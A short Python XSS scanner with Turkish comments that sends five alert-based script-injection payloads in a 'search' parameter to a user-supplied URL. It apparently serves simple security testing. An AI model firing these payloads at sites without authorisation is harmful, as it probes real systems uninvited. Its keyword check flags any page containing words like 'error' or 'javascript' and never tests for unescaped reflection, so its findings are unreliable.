import requests

def test_xss(url):
    # XSS payload'ları
    payloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg/onload=alert("XSS")>',
        '<a href="javascript:alert(\'XSS\')">click me</a>',
        '<body onload=alert("XSS")>',
    ]
    
    # Hata mesajlarını kontrol etmek için anahtar kelimeler
    error_keywords = ["error", "unexpected", "javascript", "alert", "xss", "malicious"]

    # Testler
    for payload in payloads:
        # Test URL'yi oluştur
        # Burada URL parametresi olan 'search' gibi bir parametre varsayalım. URL'yi doğru şekilde düzenleyin.
        test_url = f"{url}?search={payload}"
        
        try:
            # İstek gönder
            response = requests.get(test_url)
            
            # Yanıtı kontrol et
            response_text = response.text.lower()
            
            # Hata mesajlarının varlığını kontrol et
            if any(keyword in response_text for keyword in error_keywords):
                print(f"Potansiyel XSS açığı bulunabilir. Payload: {payload}")
                print(f"Yanıt içeriği: {response_text[:200]}...")  # İlk 200 karakteri yazdır
                return True
        except requests.RequestException as e:
            print(f"İstek başarısız: {e}")
            continue
    
    print("XSS açığı bulunamadı.")
    return False

def main():
    # Kullanıcıdan URL al
    target_url = input("XSS test etmek istediğiniz URL'yi girin : ")
    
    # XSS test et
    test_xss(target_url)

if __name__ == "__main__":
    main()
